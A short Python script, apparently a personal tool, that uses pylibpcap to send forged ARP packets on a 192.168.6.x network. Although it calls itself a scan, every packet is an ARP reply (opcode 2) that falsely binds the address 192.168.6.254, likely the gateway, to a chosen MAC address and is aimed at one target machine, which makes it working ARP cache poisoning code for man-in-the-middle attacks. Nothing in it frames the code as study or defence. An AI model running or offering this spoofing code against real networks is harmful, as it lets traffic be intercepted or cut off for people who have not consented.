import binascii
import time 
from arp import ARP 
from pylibpcap import get_first_iface, send_packet

class ARPDispatch:
    def __init__(self,dev):
        self.dev = dev 

    def scan(self):
        for i in range(1,253):
            ip="192.168.6."+str(i)
            arp = ARP()
            arp.set_src_hw("74:8f:3c:c2:4b:11")
            arp.set_src_ip("192.168.6.254")
            arp.set_opt(2)
            arp.set_dst_hw("34:64:a9:29:a3:dd")
            arp.set_dst_ip(ip)
            arp.pretty()
            send_packet(self.dev, arp.get())
            print(".")
            time.sleep(1)

if __name__ == '__main__':
    dev = get_first_iface()
    dis = ARPDispatch(dev)
    dis.scan()